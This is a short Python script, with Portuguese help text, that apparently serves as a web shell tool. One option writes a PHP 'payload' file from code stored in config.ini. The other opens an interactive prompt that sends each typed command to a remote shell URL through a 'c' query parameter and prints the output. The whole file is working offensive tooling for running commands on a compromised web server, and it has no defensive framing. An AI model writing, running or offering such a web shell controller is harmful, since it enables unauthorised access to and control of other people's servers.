from argparse import ArgumentParser
from configparser import ConfigParser
from requests import get


parser = ArgumentParser()
parser.add_argument("-u", dest="shell_url", action="store",
                    help="Url de sua shell!")
parser.add_argument("-g", dest="generate", action="store",
                    help="Cria seu payload")
args = parser.parse_args()


if args.generate:
    shell_name = str(args.generate)
    shell = shell_name+'.php'
    opfile = open(shell,'+w')
    config = ConfigParser()
    config.read_file(open('config.ini'))

    opfile.write(config['DEFAULT']['code'])
    opfile.close()
    print(shell+' is generated')


if args.shell_url:
    url = str(args.shell_url)
    while True:
        cmd = str(input(">> "))
        r = get(url+"?c={0}".format(cmd)).text
        print(r)  
